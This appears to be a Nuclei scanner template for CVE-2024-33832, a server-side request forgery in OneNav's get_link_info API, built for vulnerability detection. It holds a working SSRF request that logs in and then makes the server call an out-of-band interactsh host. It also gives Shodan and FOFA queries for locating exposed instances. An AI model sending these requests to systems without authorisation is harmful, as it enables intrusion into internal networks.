http:
- matchers:
  - part: interactsh_protocol
    type: word
    words:
    - http
  - condition: and
    part: body
    type: word
    words:
    - 'title":'
    - 'description":'
  - part: content_type
    type: word
    words:
    - application/json
  raw:
  - 'POST /index.php?c=login&check=login HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded; charset=UTF-8


    user={{username}}&password={{password}}

    '
  - 'POST /index.php?c=api&method=get_link_info HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded; charset=UTF-8


    url=http://{{interactsh-url}}

    '
id: CVE-2024-33832
info:
  author: ritikchaddha
  classification:
    cve-id: CVE-2024-33832
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:L
    cvss-score: 6.5
    cwe-id: CWE-918
    epss-percentile: 0.87241
    epss-score: 0.03512
  description: 'OneNav v0.9.35-20240318 is vulnerable to server-side request forgery
    (SSRF) via the url parameter in the get_link_info API. An attacker can force the
    server to make arbitrary requests, potentially accessing internal resources.

    '
  impact: 'Authenticated attackers can force the server to make arbitrary requests
    via the url parameter in the get_link_info API.

    '
  metadata:
    fofa-query: icon_hash="1111283449"
    max-request: 2
    product: onenav
    shodan-query: http.favicon.hash:1111283449
  name: OneNav v0.9.35-20240318 - Server-Side Request Forgery (SSRF)
  reference:
  - https://github.com/Hebing123/cve/issues/39
  - https://nvd.nist.gov/vuln/detail/CVE-2024-33832
  remediation: 'Update OneNav to a version later than v0.9.35-20240318 that patches
    the SSRF vulnerability.

    '
  severity: medium
  tags: cve,cve2024,ssrf,onenav,oast,authenticated,vuln
